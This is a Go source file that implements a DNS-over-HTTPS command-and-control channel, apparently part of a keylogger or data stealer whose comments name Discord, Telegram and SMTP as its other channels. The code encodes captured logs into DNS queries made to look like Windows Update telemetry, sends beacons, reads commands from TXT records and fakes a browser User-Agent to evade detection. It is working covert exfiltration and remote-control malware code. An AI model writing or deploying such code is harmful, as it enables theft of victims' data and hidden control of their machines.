package monitor

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// dohC2 implements a DNS-over-HTTPS based fallback command-and-control channel.
// When Discord, Telegram, and SMTP all fail, this channel encodes log data
// as TXT record queries to a DoH resolver (Cloudflare 1.1.1.1 or Google 8.8.8.8).
//
// ARCHITECTURE:
// - Logs are base64-encoded and split into DNS-label-sized chunks (63 chars max).
// - Each chunk is sent as a TXT query to {chunk}.{session}.exfil.example.com
// - A controlled DNS server on the receiving end reassembles the data.
// - Alternatively, uses DoH JSON API to POST encoded data as query params.
type dohC2 struct {
	endpoint string // DoH resolver URL (e.g., https://cloudflare-dns.com/dns-query)
	enabled  bool
}

// dohResponse represents a simplified DNS-over-HTTPS JSON response.
type dohResponse struct {
	Status int `json:"Status"`
	Answer []struct {
		Name string `json:"name"`
		Type int    `json:"type"`
		Data string `json:"data"`
	} `json:"Answer"`
}

// newDoHC2 creates a new DNS-over-HTTPS C2 channel.
func newDoHC2(endpoint string) *dohC2 {
	if endpoint == "" {
		endpoint = "https://cloudflare-dns.com/dns-query"
	}
	return &dohC2{
		endpoint: endpoint,
		enabled:  endpoint != "",
	}
}

// isEnabled returns whether DoH C2 is configured.
func (d *dohC2) isEnabled() bool {
	return d.enabled
}

// exfiltrateViaDoH encodes log data and sends it via DNS queries.
// This is a FALLBACK channel — only used when all other channels fail.
//
// Method: Encode data as base32 in DNS query names.
// The data is split into multiple DNS queries, each carrying a chunk.
// A session ID ties the chunks together for reassembly.
func (d *dohC2) exfiltrateViaDoH(data string) error {
	if !d.enabled {
		return nil
	}

	// Encode data to base64url (DNS-safe encoding).
	encoded := base64.URLEncoding.EncodeToString([]byte(data))

	// Split into 50-char chunks (DNS label max is 63, leave room for metadata).
	chunks := splitString(encoded, 50)
	sessionID := fmt.Sprintf("%x", time.Now().UnixNano()&0xFFFFFF)

	for i, chunk := range chunks {
		// Construct a DNS query name that encodes the data.
		// Format: {chunkIndex}-{totalChunks}-{sessionID}-{chunk}.telemetry.windowsupdate.com
		// This looks like legitimate Windows Update telemetry traffic.
		queryName := fmt.Sprintf("%d-%d-%s-%s.telemetry.windowsupdate.com",
			i, len(chunks), sessionID, chunk)

		// Send the DNS query via DoH.
		d.queryDoH(queryName)

		// Small delay between queries to avoid triggering rate limits.
		time.Sleep(200 * time.Millisecond)
	}

	return nil
}

// queryDoH sends a DNS query via the DoH resolver using the JSON API.
func (d *dohC2) queryDoH(name string) (*dohResponse, error) {
	// Truncate name to DNS max (253 chars total).
	if len(name) > 253 {
		name = name[:253]
	}

	url := fmt.Sprintf("%s?name=%s&type=TXT", d.endpoint, name)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Accept", "application/dns-json")
	// Mimic a legitimate browser User-Agent.
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	client := sharedHTTPClient
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result dohResponse
	json.NewDecoder(resp.Body).Decode(&result)
	return &result, nil
}

// checkForCommands queries a DoH resolver for TXT records that may contain
// commands from the C2 server. This is a pull-based C2 mechanism.
func (d *dohC2) checkForCommands(sessionDomain string) string {
	if !d.enabled || sessionDomain == "" {
		return ""
	}

	resp, err := d.queryDoH(sessionDomain)
	if err != nil || resp == nil {
		return ""
	}

	for _, answer := range resp.Answer {
		if answer.Type == 16 { // TXT record
			// Strip surrounding quotes from TXT data.
			cmd := strings.Trim(answer.Data, "\"")
			return cmd
		}
	}

	return ""
}

// sendBeacon sends a DNS beacon to indicate the agent is alive.
// Uses a standard-looking DNS query format.
func (d *dohC2) sendBeacon(hostID string) {
	if !d.enabled {
		return
	}

	beaconName := fmt.Sprintf("%s.%d.beacon.windowsupdate.com",
		hostID, time.Now().Unix())
	d.queryDoH(beaconName)
}

// postViaDoH uses an alternative method: POST encoded data to the DoH endpoint
// disguised as a DNS query payload.
func (d *dohC2) postViaDoH(data []byte) error {
	if !d.enabled {
		return nil
	}

	// Encode as a DNS wire-format query (simplified).
	req, err := http.NewRequest("POST", d.endpoint, bytes.NewReader(data))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/dns-message")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	client := sharedHTTPClient
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

// splitString splits a string into chunks of maxLen.
func splitString(s string, maxLen int) []string {
	var chunks []string
	for len(s) > 0 {
		if len(s) <= maxLen {
			chunks = append(chunks, s)
			break
		}
		chunks = append(chunks, s[:maxLen])
		s = s[maxLen:]
	}
	return chunks
}
